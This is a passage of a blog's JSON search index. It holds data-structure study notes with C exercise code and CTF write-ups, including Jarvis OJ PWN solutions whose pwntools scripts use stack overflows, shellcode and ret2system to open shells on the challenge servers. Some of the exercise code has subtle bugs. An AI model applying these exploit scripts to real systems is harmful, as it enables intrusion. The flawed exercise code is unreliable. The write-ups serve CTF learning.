//其中，T非空，1&lt;&lt;pos&lt;&lt;StrLength(S) i = pos; j = 1; while(i &lt;= S[0] &amp;&amp; j &lt;= T[0]) { if(j == 0 || S[i] == T[j]) // 继续比较后续字符 { ++i; ++j; } else j = next[j]; // 模式串向右移动 } if(j &gt; T[0]) return i - T[0]; // 匹配成功 else return 0; } void get_next(SString T, int next[]) { // 求模式串T的next函数值并存入next数组 i= 1； next[1] = 0; j = 0; while(i &lt; T[0]) { if(j == 0 || T[i] == T[j]) { ++i; ++j; next[i] = j; } else j = next[j]; } } 完整KMP的C Plus的实现：#include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;stdlib.h&gt; using namespace std; void findnext(char *pattern, int *next) { int len = strlen(pattern); next[0] = 0; for(int i = 1; i &lt; len; i++) { int j = next[i-1]; while(j &gt; 0 &amp;&amp; pattern[j] != pattern[i]) j = next[j-1]; if(pattern[j] == pattern[i]) next[i] = j + 1; else next[i] = 0; } cout &lt;&lt; &quot;partial match table: &quot;; for(int i = 0; i &lt; len; i++) cout &lt;&lt; next[i] &lt;&lt; &quot; &quot;; } int KMP(char *pattern, char *sourceString, int *next) { int sourcelength = strlen(sourceString); int patternlength = strlen(pattern); int p = 0, s = 0; while(p &lt; patternlength &amp;&amp; s &lt; sourcelength &amp;&amp; patternlength &lt;= sourcelength) { if(pattern[p] == sourceString[s]) { s++; p++; } else { if(p == 0) s++; else p = next[p - 1]; } } return p == patternlength ? s - patternlength : -1; } int main() { int next[100]; char pattern[100]; char sourceString[100]; int position; cout &lt;&lt; &quot;please input source string and pattren:&quot; &lt;&lt; endl; while(cin &gt;&gt; sourceString &gt;&gt; pattern) { findnext(pattern, next); position = KMP(pattern, sourceString, next); cout &lt;&lt; endl &lt;&lt; &quot;matched from &quot; &lt;&lt; position &lt;&lt; &quot; to &quot; &lt;&lt; position + strlen(pattern) &lt;&lt;endl; } system(&quot;pause&quot;); }","categories":[],"tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://leo.dropsec.xyz/tags/数据结构与算法/"}]},{"title":"重温数据结构-线性表","slug":"重温数据结构-线性表","date":"2018-07-31T12:55:58.000Z","updated":"2018-08-01T02:50:58.537Z","comments":true,"path":"2018/07/31/重温数据结构-线性表/","link":"","permalink":"http://leo.dropsec.xyz/2018/07/31/重温数据结构-线性表/","excerpt":"线性表是最基本、最简单、也是最常用的一种数据结构。","text":"线性表是最基本、最简单、也是最常用的一种数据结构。 线性表线性表的顺序表示和实现//线性表的动态分配顺序存储结构 #define LIST_INIT_SIZE 100 //线性表存储空间的初始分配量 #define LISTINCREMENT 10 //分配增量 typedef struct { ElemType * elem; //存储空间基址 int length; //当前长度 int listsize; //当前分配的存储容量（以sizeof(ElemType)为单位） }SqList; Status InitList_Sq(SqList &amp;L) { //构造一个空的线性表L L.elem = (ElemType * ) malloc (LIST_INIT_SIZE * sizeof(ElemType)); if(!L.elem) exit(OVERFLOW); //存储分配失败 L.length = 0; //空表长度为0 L.listsize = LIST_INIT_SIZE; //初始存储容量 return OK; } Status ListInset_Sq(SqList &amp;L, int i, ElemType e) { //在顺序线性表L中第i个位置之前插入新的元素e //i的合法值为 1 &lt;= i &lt;= ListLength_Sq(L) + 1 if( i &lt; 1 || i L.length + 1) return ERROR; //i值不合法 if(L.Length &gt;= L.listsize) { //当前存储空间已满，增加分配 newbase = (ElemType * ) realloc(L.elem, (L.listsize + LISTINCREMENT) * sizeof(ElemType)); if(!newbase) exit(OVERFLOW); //存储分配失败 L.elem = newbase; //新基址 L.listsize += LISTINCREMENT; //增加存储容量 } q = &amp; (L.elem[i-1]); //q为插入位置 for(p = &amp;(L.elem[L.length-1]); p &gt;= q; --p) *(p + 1) = *p; //插入位置及之后的元素右移 *q = e; //插入e ++L.length; //表长加一 return Ok; } Status ListDelete_Sq(SqList &amp;L, int i, ElemType &amp;e) { //在顺序表L中删除第i个元素，并用e返回其值 //i的合法值为 1 &lt;= i &lt;= ListLength_Sq(L) if(i &lt; 1 || i &gt; L.length) return ERROR; p = &amp; (L.elem[i-1]); //p为被删除元素的位置 e = *p; q = L.elem + L.length - 1; //表尾元素的位置 for(++p; p &lt;= q; ++p) *(p - 1) = *p; //被删除元素之后的元素左移 --L.length; //表长减一 return OK; } void MergeList_Sq(SqList La, SqList Lb, SqList &amp;Lc) { //已知顺序线性表La和Lb中的元素按值非递减排列 //归并La Lb到顺序线性表Lc，Lc的元素值也按值非递减排列 pa = La.elem; pb = Lb.elem; Lc.listsize = Lc.length = La.length + Lb.length; pc = Lc.elem = (ElemType * ) malloc (Lc.listsize * sizeof(ElemType)); if(!Lc.elem) exit(OVERFLOW); //存储分配失败 pa_last = La.elem + La.length - 1; pb_last = Lb.elem + Lb.length - 1; while(pa &lt;= pa_last &amp;&amp; pb &lt;= pb_last) { //归并 if( * pa &lt;= * pb) * pc++ = * pa++; else * pc++ = * pb++; } while(pa &lt;= pa_last) * pc++ = * pa++; //插入La中剩余元素 while(pb &lt;= pb_last) * pc++ = * pb++; } 线性表的链式表示和实现//线性表的单链表存储结构 typedef struct LNode { ElemType data; Struct LNode *next; }LNode, *LinkList; Status GetElem_L(LinkList L, int i, ElemType &amp;e) { // L为带头结点的单链表的头指针 // 当第i个元素存在时，其值赋给e并返回OK，否则返回ERROR p = L -&gt; next; j = 1; //初始化，p指向第一个结点，j为计数器 while(p &amp;&amp; j &lt; i) { //顺时针向后查找，直到p指向第i个元素或p为空 p = p -&gt; next; ++j; } if(!p || j &gt; i) return ERROR; //第i个元素不存在 e = p -&gt; data; //取第i个元素 return OK; } Status ListInsert_L(LinkList &amp;L, int i, ElemType e) { // 在带头结点的单链线性表L中第i个位置之前插入元素e p = L; j = 0; while(p &amp;&amp; j &lt; i - 1) { // 寻找第i-1个结点 p = p -&gt; next; ++j; } if(!p || j &gt; i-1) return ERROR; // i小于1或者大于表长加1 s = (LinkList) malloc (sizeof(LNode)); //生成新结点 s -&gt; data = e; s -&gt; next = p -&gt; next; p -&gt; next = s; return OK; } Status ListDelete_L(LinkList &amp;L, int i, ElemType &amp;e) { // 在带头结点的单链线性表L中，删除第i个元素，并由e返回其值 p = L; j = 0; while(p-&gt;next &amp;&amp; j &lt; i-1) { // 寻找第i个结点，并令p指向其前驱 p = p -&gt; next; ++j; } if(!(p-&gt;next) || j &gt; i-1) return ERROR; // 删除位置不合理 q = p -&gt; next; p -&gt; next = q -&gt; next; // 删除并释放结点 e = q -&gt; data; free(q); return OK; } void CreateList_L(LinkList &amp;L, int n) { // 逆位序输入n个元素的值，建立带表头结点的单链线性表L L = (LinkList) malloc (sizeof(LNode)); L -&gt; next = NULL; // 先建立一个带头结点的单链表 for(i = n; i &gt; 0; --i) { p = (LinkList) malloc (sizeof(LNode)); // 生成新结点 scanf(&amp;p -&gt; data); // 输入元素值 p -&gt; next = L -&gt; next; L -&gt; next = p; // 插入到表头 } } // 对比着顺序线性表的归并理解 void MergeList_L(LinkList &amp;La, LinkList &amp;Lb, LinkList &amp;Lc) { // 已知单链线性表La和Lb的元素按值非递减排列 // 归并La和Lb得到新的单链线性表Lc, Lc的元素也按值非递减排列 pa = La -&gt; next; pb = Lb -&gt; next; Lc = pc = La; // 用La的头结点作为Lc的头结点 while(pa &amp;&amp; pb) { if(pa -&gt; data &lt;= pb -&gt; data) { pc -&gt; next = pa; pc = pa; pa = pa -&gt; next; } else { pc -&gt; next = pb; pc = pb; pb = pb -&gt; next; } } pc -&gt; next = pa ? pa : pb; // 插入剩余段 free(Lb); //释放Lb的头结点 } 双向链表// 线性表的双向链表存储结构 typedef struct DuLNode { ElemType data; struct DuLNode *prior; struct DuLNode *next; }DuLNode, *DuLinkList; Status ListInsert_DuL(DuLinkList &amp;L, int i, ElemType e) { // 在带头结点的双链循环线性表L中第i个位置之前插入元素e // i的合法值为 1&lt;=i&lt;=表长+1 if(!(p = GetElemP_DuL(L, i))) // 在L中确定插入位置 return ERROR; // p=NULL 插入位置不合法 if(!(s = (DuLinkList) malloc (sizeof(DuLNode)))) return ERROR; s -&gt; data = e; s -&gt; prior = p -&gt; prior; p -&gt; prior -&gt; next = s; s -&gt; next = p; p -&gt; prior = s; return OK; } Status ListDelete_DuL(DuLinkList &amp;L, int i, ElemType &amp;e) { // 删除带头结点的双链循环线性表L的第i个元素，i的合法值为1&lt;=i&lt;=表长 if(!(p = GetElemP_DuL(L, i))) return ERROR; e = p -&gt; data; p -&gt; prior -&gt; next = p -&gt; next; p -&gt; next -&gt; prior = p -&gt; prior; free(p); return OK; } 题集例题2.10 从顺序存储结构的线性表a中删除第i个元素起的k个元素 Status DeleteK {SqList &amp;a, int i, int k) { if(i &lt; 1 || i &gt; a.length - 1 || k &lt; 0 || k &gt; a.length - i) //注意i的编号从0开始 return INFEASIBLE; for(j = 0; j &lt; k; j++) a.elem[i+j] = a.elem[i+K+j]; a.length = a.length - k; return OK; } 2.11 设顺序表va中的数据元素递增有序。试写一算法，将x插入到顺序表的适当位置上，以保持该表的有序性。 Status InsertOrderList(SqList &amp;va, ElemType x) { int i; if(va.length == va.listsize) return(OVERFLOW); for(i = va.length; i &gt; 0, x &lt; va.elem[i-1]; i--) va.elem[i] = va.elem[i-1]; va.elem[i] = x; va.length++; return OK; } 2.19 已知线性表中的元素以值递增有序排列，并以单链表作存储结构。试写一高效的算法，删除表中所有值大于mink且小于maxk的元素（若表中存在这样的元素），同时释放被删结点空间，并分析你的算法的时间复杂度（注意，mink和maxk是给定的两个参变量，它们的值可以和表中的元素相同，也可以不同）。 Status Delete_Between(Linklist &amp;L, int mink, int maxk) { p = L; while(p-&gt;next-&gt;data &lt;= mink) p = p -&gt; next; // p是最后一个不大于mink的元素 if(p-&gt;next) // 如果还有比mink更大的元素 { q = p -&gt; next; while(q-&gt;data &lt; maxk) q = q -&gt; next; // q是第一个不小于maxk的元素 p -&gt; next = q; } return OK; } 2.21 试写一算法，实现顺序表的就地逆置，即利用原表的存储空间将线性表倒置。 Status ListReverse_Sq(SqList &amp;L) { int i; ElemType x; for(i = 0; i &lt; l.length/2; i++) { x = L.elem[i]; L.elem[i] = L.elem[L.length-1-i]; L.elem[L.length-1-i] = x; } return OK; } 2.22 试写一算法，对单链表实现就地逆置。 Status ListReverse_L(LinkList &amp;L) { LinkList p,q; p = L -&gt; next; L -&gt; next = NULL; while(p){ q = p; p = p -&gt; next; q -&gt; next = L -&gt; next; L -&gt; next = q; } return OK; } 2.25 假设以两个元素依值递增有序排列的线性表 A和 B 分别表示两个集合（即同一表中的元素 值各不相同） ，现要求另辟空间构成一个线性表 C，其元素为 A 和 B中元素的交集，且表 C中的 元素依值递增有序排列。试对顺序表编写求 C的算法。 Status SqList_Insert(SqList A, SqList B, SqList &amp;C) { int i = 1, j = 1, k = 0; while(A.elem[i] &amp;&amp; B.elem[j]) { if(A.elem[i] &lt; B.elem[j]) i++; if(A.elem[i] &gt; B.elem[j]) j++; if(A.elem[i] = B.elem[j]) { C.elem[k++] = B.elem[j]; i++; j++; } } return OK; }","categories":[],"tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://leo.dropsec.xyz/tags/数据结构与算法/"}]},{"title":"重温数据结构-栈和队列","slug":"重温数据结构-栈和队列","date":"2018-07-30T10:11:11.000Z","updated":"2018-07-31T12:55:07.736Z","comments":true,"path":"2018/07/30/重温数据结构-栈和队列/","link":"","permalink":"http://leo.dropsec.xyz/2018/07/30/重温数据结构-栈和队列/","excerpt":"自认为听起来的“堆栈”和看起来的“殷墟”一样，让人着迷。","text":"自认为听起来的“堆栈”和看起来的“殷墟”一样，让人着迷。 栈栈（stack）是限定仅在表尾进行插入或删除操作的线性表。因此，对栈来说，表尾端有其特殊含义，称为栈顶，相应地，表头端称为栈底。 栈又称为后进先出的线性表（简称LIFO结构）。 栈的基本操作包含建栈、入栈、出栈… 以下是栈的实现方式：//栈的顺序存储表示 #define STACK_INIT_SIZE 100 //存储空间初始分配量 #define STACKINCREMENT 10 //存储空间分配增量 typedef struct { SElemType * base; //在栈构造之前和销毁之后，base的值为null SElemType * top; //栈顶指针 int stacksize; //当前已分配的存储空间，以元素为单位 }SqStack; //基本操作的算法描述（部分） Status InitStack (SqStack &amp;S) { //构造一个空栈S S.base = (SElemType * ) malloc (STACK_INIT_SIZE * sizeof(SElemType)); if (!S.base) exit (overflow); //存储分配失败 S.top = S.base; S.stacksize = STACK_INIT_SIZE; return OK; }//InitStack Status GetTop (SqStack S, SElemType &amp;e) { //若栈不空，则用e返回S的栈顶元素，并返回OK；否则返回ERROR if (S.top == S.base) return ERROR; e = * (S.top - 1); return OK; }//GetTop Status Push (SqStack &amp;S, SElemType e) { //插入元素e为新的栈顶元素 if (S.top - S.base &gt;= S.stacksize) { //栈满，追加存储空间 S.base = (SElemType * ) realloc (S.base, (S.stacksize + STACKINCREMENT) * sizeof (SElemType)); if (!S.base) exit (OVERFLOW); //存储分配失败 S.top = S.base + S.stacksize; S.stacksize += STACKINCREMENT; } * S.top++ = e; return OK; }//Push Status Pop (SqStack &amp;S, SelemType &amp;e) { //若栈不空，则删除S的栈顶元素，用e返回其值，并返回OK；否则返回ERROR if (S.top == S.base) return ERROR; e = * --S.top; return OK; }//Pop 队列和栈相反，队列（queue）是一种先进先出（FIFO）的线性表。它只允许在表的一端进行插入，而在另一端删除元素。在队列中，允许插入的一端叫做队尾，允许删除的一端叫做队头。 队列的基本操作包括：构造队列、销毁队列、插入元素、删除元素… 以下是队列的实现方式：单链队列–链式存储//单链队列的链式存储结构 typedef struct QNode { QElemType data; struct QNode * next; }QNode, * QueuePtr; typedef struct { QueuePtr front; //队头指针 QueuePtr rear; //队尾指针 }LinkQueue; //基本操作的算法描述（部分） Status InitQueue (LinkQueue &amp;Q) { //构造一个空队列Q Q.front = Q.rear = (QueuePtr) malloc (sizeof(QNode)); if (!Q.front) exit (OVERFLOW); //存储分配失败 Q.front -&gt; next = NULL; return OK; } Status DestroyQueue (LinkQueue &amp;Q) { //销毁队列Q while (Q.front) { Q.rear = Q.front -&gt; next; free (Q.front); Q.front = Q.rear; } return OK; } Status EnQueue (LinkQueue &amp;Q, QElemType e) { //插入元素e 为Q的队尾元素 p = (QueuePtr) malloc (sizeof(QNode)); if(!p) exit (OVERFLOW); //存储分配失败 p -&gt; data = e; p -&gt; next = NULL; Q.rear -&gt; next = p; Q.rear = p; return OK; } Status DeQueue (LinkQueue &amp;Q, QElemType &amp;e) { //若队列不空，则删除Q的队头元素，用e返回其值，并返回OK 否则返回ERROR if (Q.front == Q.rear) return ERROR; p = Q.front -&gt; next; e = p -&gt; data; Q.front -&gt; next = p -&gt; next; if (Q.rear == p) Q.rear = Q.front; //一般情况下，删除队列头元素时仅需修改头结点中的指针 free (p); //但当队列中最后一个元素被删除后，队列尾指针也丢失了，因此需要对队尾指针重新赋值（指向头结点） return OK; } 循环队列–顺序存储//循环队列 顺序存储结构 #define MAXQSIZE 100 //最大队列长度 typedef struct { QElemType * base; //初始化的动态分配存储空间 int front; //头指针，若队列不空，指向队列头元素 int rear; //尾指针，若队列不空，指向队列尾元素的下一个位置 }SqQueue; //循环队列的基本操作的算法描述 Status InitQueue (SqQueue &amp;Q) { //构造一个空队列Q Q.base = (QElemType * ) malloc (MAXQSIZE * sizeof (QElemType)); if (!Q.base) exit(OVERFLOW); //存储分配失败 Q.front = Q.rear = 0; return OK; } int QueueLength (SqQueue Q) { //返回Q的元素个数，即队列长度 return (Q.rear - Q.front + MAXQSIZE) % MAXQSIZE; } Status EnQueue (SqQueue &amp;Q, QElemType e) { //插入元素e 为Q的队尾元素 if ((Q.rear + 1) % MAXQSIZE == Q.front) return ERROR; //队列满 Q.base[Q.rear] = e; Q.rear = (Q.rear + 1) % MAXQSIZE; return OK; } Status DeQueue (SqQueue &amp;Q, QElemType &amp;e) { //若队列不空，则删除Q的队头元素，用e返回其值，并返回OK，否则返回ERROR if(Q.front == Q.rear) return ERROR; e = Q.base[Q.front]; Q.front = (Q.front + 1) % MAXQSIZE; return OK; } 题集经典例题：3.15 假设以顺序存储结构实现一个双向栈，即在一维数组的存储空间中存在着两个栈，它们的栈底分别设在数组的两个端点。 试编写实现这个双向栈 tws 的三个操作： 初始化 inistack(tws) 、 入栈 push(tws,i,x) 和出栈 pop(tws,i) 的算法，其中 i 为 0 或 1，用以分别指示设在数组两端的 两个栈 typedef struct { Elemtype * base[2]; Elemtype * top[2]; }BDStacktype; //双向栈类型 Status Init_Stack (BDStacktype &amp;tws, int m) //初始化一个大小为m的双向栈tws { tws.base[0] = (Elemtype * ) malloc (sizeof(Elemtype)); tws.base[1] = tws.base[0] + m; tws.top[0] = tws.base[0]; tws.top[1] = tws.base[1]; return OK; } Status push (BDStscktype &amp;tws, int i, Elemtype x) //x入栈，i=0表示低端栈，i=1表示高端栈 { if (tws.top[0] &gt; tws.top[1]) return OVERFLOW; if (i == 0) * tws.top[0]++ = x; else if (i == 1) * tws.top[1]-- = x; else return ERROR; return OK; } Status pop (BDStacktype &amp;tws, int i, Elemtype &amp;x) { if (i == 0) { if (tws[0] == tws.base[0]) return OVERFLOW; x = * --tws.top[0]; } else if (i == 1) { if (tws.top[1] == tws.base[1]) return OVERFLOW; x = * ++tws.top[1]; } else return ERROR; return OK; } 3.16 假设如题 3.1 所属火车调度站的入口处有 n 节硬席或软席车厢（分别以 H和 S 表示）等待 调度，试编写算法，输出对这 n 节车厢进行调度的操作（即入栈或出栈操作）序列，以使所有的 软席车厢都被调整到硬席车厢之前。 void Train_arrange (char * train) //字符串train表示火车 H表示硬席 S表示软席 { p = q = train; InitStack (s); while ( * p) { if ( * p == &apos;H&apos; ) push (s, *p); else * (q++) = * p; //把S调到前部 p++; } while (!StackEmpty(s)) { pop (s,c); * (q++) = c; //把H接到后部 } } 3.17 试写一个算法，识别一次读入的一个以 @为结束符的字符序列是否为形如‘序列 1&amp;序列 2’ 模式的字符序列。其中序列 1 和序列 2 中都不含字符‘ &amp;’，且序列 2 是序列 1 的逆序列。例如， ‘a+b&amp;b+a’是属该模式的字符序列，而‘ 1+3&amp;3-1 ’则不是。 int IsReverse () //判断输入的字符串中&apos;&amp;&apos;前和&apos;&amp;&apos;后部分是否为逆串,是则返回1,否则返回0 { InitStack (s); while ((e = getchar()) != &apos;&amp;&apos; ) push (s,e); while ((e = getchar()) != &apos;@&apos; ) { if (StackEmpty(s)) return 0; pop (s,c); if (e != c) return 0; } if (!StackEmpty(s)) return 0; return 1; } 3.18 试写一个判别表达式中开、闭括号是否配对出现的算法。 Status Bracket_Test (char * str) //判别表达式中小括号是否匹配 { count = 0; for (p = str; * p; p++) { if ( * p == &apos;(&apos; ) count++; if ( * p == &apos;)&apos; ) count--; if (count &lt; 0) return ERROR; } if (count) //注意括号不匹配的两种情况 return ERROE; return OK; } 3.19 假设一个算术表达式中可以包括三种括号：圆括号“（”和“）”、方括号“ [ ”和“ ] ” 和花括号“{ ”和“} ”，且这三种括号可按任意的次序嵌套使用 （如：, [ , { , } , [ , ] , ] , [ , ] , ( , ) , ） 。编写判别给定表达式中所含括号是否正确配对出现的算法 （已知表达式已存入数据元 素为字符的顺序表中）。 Status AllBrackets_Test (char * str) { InitStack (s); for (p = str; * p; p++) { if ( * p == &apos;(&apos; || * p == &apos;[&apos; || * p == &apos;{&apos; ) push ( s, * p); else if ( * p == &apos;)&apos; || * p == &apos;]&apos; || * p == &apos;}&apos; ) { if (StackEmpty(s)) return ERROR; pop (s,c); if ( * p == &apos;)&apos; &amp;&amp; c != &apos;(&apos; ) return ERROR; if ( * p == &apos;]&apos; &amp;&amp; c != &apos;[&apos; ) return ERROR; if ( *p == &apos;}&apos; &amp;&amp; c != &apos;{&apos; ) return ERROR; } } if (!StackEmpty(s)) return ERROR; } 3.28 假设以带头结点的循环链表表示队列，并且只设一个指针指向队尾元素结点（注意不设头指针），试编写相应的队列初始化、入队列和出队列的算法。 void InitCiQueue (CiQueue &amp;Q) //初始化循环链表表示的队列Q { Q = (CiLNode * ) malloc (sizeof(CiLNode)); Q -&gt; next = Q; } void EnCiQueue (CiQueue &amp;Q, int x) //把元素x插入循环链表表示的队列Q,Q指向队尾元素,Q-&gt;next指向头结点,Q-&gt;next-&gt;next指向队头元素 { p = (CiLNode * ) malloc (sizeof(CiLNode)); p -&gt; data = x; p -&gt; next = Q -&gt; next; //直接把p加在Q的后面 Q -&gt; next = p; Q = p; //修改尾指针 } Status DeCiQueue (CiQueue &amp;Q, int x) //从循环链表表示的队列Q头部删除元素x { if (Q == Q -&gt; next) return INFEASIBLE; //队列已空 p = Q -&gt; next -&gt; next; x = p -&gt; data; Q -&gt; next - next = p -&gt; next; free (p); return OK; } 3.30 假设将循环队列定义为 : 以域变量 rear 和 length 分别指示循环队列中队尾元素的位置和内 含元素的个数。 试给出此循环队列的队满条件， 并写出相应的入队列和出队列的算法 （在出队列 的算法中要返回队头元素）。 Status EnCyQueue (CyQueue &amp;Q, int x) //带length域的循环队列入队算法 { if (Q.length == MAXSIZE) return OVERFLOW; Q.rear = (Q.rear + 1) % MAXSIZE; Q.base[Q.rear] = x; Q.length++; return OK; } Status DeCyQueue (CyQueue &amp;Q, int x) //带length域的循环队列出队算法 { if (Q.length == 0) return ERROR; front = (Q.rear - Q.length + 1) % MAXSIZE; x = Q.base[front]; Q.length--; } 3.31 假设称正读和反读都相同的字符序列为“回文”，例如，‘ abba’和‘ abcba’是回文， ‘abcde’和‘ ababab’则不是回文。 试写一个算法判别读入的一个以‘ @’为结束符的字符序列 是否是“回文” 。 int Palindrome_Test () //判别输入的字符串是否回文序列,是则返回1,否则返回0 { InitStack (S); InitQueue (Q); //同时使用栈和队列两种结构 while ((c = getchar()) != &apos;@&apos; ) { Push (S,c); EnQueue (Q,c); } while (!StackEmpty(S)) { Pop (S,a); DeQueue (Q,b); if (a != b) return ERROR; } return OK; }","categories":[],"tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://leo.dropsec.xyz/tags/数据结构与算法/"}]},{"title":"安恒杯5月月赛","slug":"安恒杯5月月赛","date":"2018-05-29T10:40:13.000Z","updated":"2018-07-30T14:02:59.182Z","comments":true,"path":"2018/05/29/安恒杯5月月赛/","link":"","permalink":"http://leo.dropsec.xyz/2018/05/29/安恒杯5月月赛/","excerpt":"前一阵子比较乱，PWN的学习、HNCTF、甲骨文培训加上对大三时间安排的初步构想一下子涌了过来…然后持续低迷了十天多一点，直到现在。桌面攒下了好多需要处理的东西…","text":"前一阵子比较乱，PWN的学习、HNCTF、甲骨文培训加上对大三时间安排的初步构想一下子涌了过来…然后持续低迷了十天多一点，直到现在。桌面攒下了好多需要处理的东西… 一、baby_writeup下载链接其实算是逆向题目，在这里划归密码。首先改个方便点的名字:123，file 123，ELF 64-bit，一般下载下来的文件还不可以直接运行 那就ls -l 123查看一下文件权限 若没有可执行权限 用chmod 777 123改下权限 然后就可以正常运行了 运行后输入一串字符结束 strings 123搜索字符串 发现有flag字符然后到ida里去看一下 通过关键字符flag找到关键伪代码基本思路就是 长16的字符串经过sub_400756的处理与byte_601100处的字符比较 相等即输出flag(输入的字符串) 这种题目见的也是比较多的常规思路就是去分析函数sub_400756,然后逆着写脚本得到flag，但是遇到复杂一点的函数分析就比较困难了。在这里提供两种思路。省时方法一：shift+e提取出byte_601100处的数据后发现大部分是不可见字符，输入的可见字符串经过函数操作变成了不可见字符串，把不可见字符变成可见字符的常见处理有两种：hex和base64 Base64可以将任意的字节数组数据通过算法生成只有（英文大小写，数字，+，/）共64种字符的字符串数据；相当于将任意内容转换为可见字符串表示。 Hex将每一个字节表示的十六进制表示的内容，用字符串来显示。将不可见的，复杂的字节数组数据，转换为可显示的字符串数据,类似于Base64编码算法. 区别：Base64将三个字节转换为四个字符，Hex将三个字节转换为六个字节 如果你有这样的想法，那已经说明你很幸运，不管对不对，试试嘛，搞不好一血就是你的。 用shift+e提取出hex形式的数据6DAB1EEB88B9B6179B7ACB7Edecode(hex())了一下发现还有很多不可见字符 所以将目标锁定base64 然后抄工具吧，今天咱们不用在线工具了(不可见字符用在线工具不太方便又懒的写脚本)，用 burpsuite。 思路：将hex数据先变成对应ascii字符，然后再encode(base64()) 即先decode(hex()) 再encode(base64())得到flag。 方法二：分析函数sub_400756哇，好复杂，好乱，看不懂…幸好发现了关键点flag的长度除以4乘以3，这不是base64的敏感操作嘛？只不过是decode(base64())而已 那基本也就是了 如果你还是有点怀疑的话那就在函数这下个断点 随便输入点东西验证一下喽呐，输入1234567891234567后经过函数出来后是0x5df7fcaee7f86dd7，与decode(base64())后的值相等 二、听说这题是rsa的续集下载链接RSA题目，原本计划还是按照老的套路来解，发现N太大，分解不了。只能寻找利器。找到利器然后就结束了。 利器：rsa-wiener-attack-master然后在RSAwienerHacker中简单编辑一下运行得到d d:8920758995414587152829426558580025657357328745839747693739591820283538307445然后带入d 运行(python2.7)得到flag 注：notepad++ 运行复制过来的代码时，默认tab不等于4个空格，会出现IndentationError: unindent does not match any outer indentation level错误，解决方法是：设置-首选项-语言-勾上’替换为空格’就ok了。","categories":[],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://leo.dropsec.xyz/tags/Reverse/"}]},{"title":"Jarvis OJ PWN 入门学习","slug":"Jarvis-OJ-PWN-入门学习","date":"2018-05-14T09:29:04.000Z","updated":"2018-05-14T13:54:16.053Z","comments":true,"path":"2018/05/14/Jarvis-OJ-PWN-入门学习/","link":"","permalink":"http://leo.dropsec.xyz/2018/05/14/Jarvis-OJ-PWN-入门学习/","excerpt":"背景知识：64位程序与32位程序有几处不同点，其中之一为参数传递方式不同，32位程序通过栈传参，64位优先寄存器，前6个参数保存在寄存器内，依次保存在rdi, rsi, rdx, rcx, r8, r9，剩余的参数，从右到左入栈。","text":"背景知识：64位程序与32位程序有几处不同点，其中之一为参数传递方式不同，32位程序通过栈传参，64位优先寄存器，前6个参数保存在寄存器内，依次保存在rdi, rsi, rdx, rcx, r8, r9，剩余的参数，从右到左入栈。 一、[XMAN]level0下载链接题目描述： nc pwn2.jarvisoj.com 9881 file查看文件信息，64位程序；checksec后发现开了NX，然后拉进ida找到两个关键函数 buffer的大小是0x80，而read函数直接读取0x200的数据，有典型的栈溢出漏洞。由于rbp中有0x8个字节，我们的padding需要0x80 + 0x8字节。填满buffer后调用callsystem函数即可get shell。脚本如下： from pwn import * sh = remote(&apos;pwn2.jarvisoj.com&apos;, 9881) padding = &apos;A&apos; * 0x88 callsystem = 0x400596 #构造payload。 payload = padding + p64(callsystem) #交互 sh.send(payload) sh.interactive() p64()默认将int转为little-endian bytes。32位文件用p32()，例如： &gt;&gt;&gt; p64(0xdeadbeef) &apos;\\xef\\xbe\\xad\\xde&apos; CTF{713ca3944e92180e0ef03171981dcd41} 二、[XMAN]level1下载链接题目描述： nc pwn2.jarvisoj.com 9877 file查看文件信息，32位程序；checksec后没开常用保护机制 ida查看发现有一个关键函数这次没有callsystem函数，需要生成shellcode。没有开启NX保护，可以插入shellcode。这里buf有0x88个字节，再加上ret本身的0x4个字节，偏移量为0x8C，还要减去shellcode的长度。连接到服务器，发现每次会随机给出一个地址，类似这样： yl123456@ubuntu:~/Desktop$ nc pwn2.jarvisoj.com 9877 What&apos;s this:0xfff180b0? 编写脚本的时候要读取这个地址，将其定义为buf_addr。 脚本如下： from pwn import * #调用pwntools自带的功能生成shellcode shellcode = asm(shellcraft.sh()) io = remote(&apos;pwn2.jarvisoj.com&apos;, 9877) #提取给出的地址并将string转为int buf_addr = int(io.recvline()[14:-2], 16) #构造payload payload = shellcode + &apos;A&apos; * (0x8C -len(shellcode)) + p32(buf_addr) io.send(payload) io.interactive() 第二种写法： from pwn import * p = remote(&quot;pwn2.jarvisoj.com&quot;,9877) shellcode = asm(shellcraft.sh()) p.recvuntil(&quot;What&apos;s this:&quot;) buf_addr = int(p.recvuntil(&quot;?&quot;)[:-1],16) payload = shellcode.ljust(140,&apos;a&apos;) + p32(buf_addr) p.send(payload) p.interactive() CTF{82c2aa534a9dede9c3a0045d0fec8617} 三、[XMAN]level2下载链接题目描述： nc pwn2.jarvisoj.com 9878 file查看文件信息，32位程序；checksec发现开了NX保护 ida查看关键函数 字符串里还发现有/bin/sh 我们需要构造system(“/bin/sh”)。脚本如下： from pwn import * sh = remote(&apos;pwn2.jarvisoj.com&apos;, 9878) #指定elf文件 elf = ELF(&apos;./level2&apos;) #定位system函数地址 sys_addr = elf.symbols[&apos;system&apos;] #定位/bin/sh的地址 sh_addr = elf.search(&apos;/bin/sh&apos;).next() #注意这里的p32(4)是虚拟的返回地址，输入什么都可以 payload = &apos;A&apos; * 0x8C + p32(sys_addr) + p32(4) + p32(sh_addr) sh.send(payload) sh.interactive() 也可以不用定位函数，因为没开启PIE保护，所以直接用ida找到system函数、/bin/sh对应对应的地址也ok from pwn import * sys_addr = 0x08048320 sh_addr = 0x0804A024 payload = &apos;A&apos; * 0x8C + p32(sys_addr) + p32(4) + p32(sh_addr) sh = remote(&apos;pwn2.jarvisoj.com&apos;, 9878) sh.send(payload) sh.interactive() CTF{1759d0cbd854c54ffa886cd9df3a3d52} 四、[XMAN]level2(x64)下载链接题目描述： nc pwn2.jarvisoj.com 9882 file查看文件信息，64位程序；checksec发现开了NX保护 ida查看关键函数 和level2有点类似 同样能看到/bin/sh我们可以找到system函数，/bin/sh的地址，而且可以得到0x88个字节就会溢出，这样前期准备就都做好了，剩下的就是如何将参数传递给rdi寄存器，因此，我们需要一些gadget来满足我们的需求 命令： ROPgadget --binary level2_x64 --only &apos;pop|ret&apos; 这样，我们可以很容易的找到pop rdi,地址为0x00000000004006b3 from pwn import * p = remote(&quot;pwn2.jarvisoj.com&quot;,9882) elf = ELF(&quot;./level2_x64&quot;) pop_rdi_ret_addr = 0x00000000004006b3 system_plt = 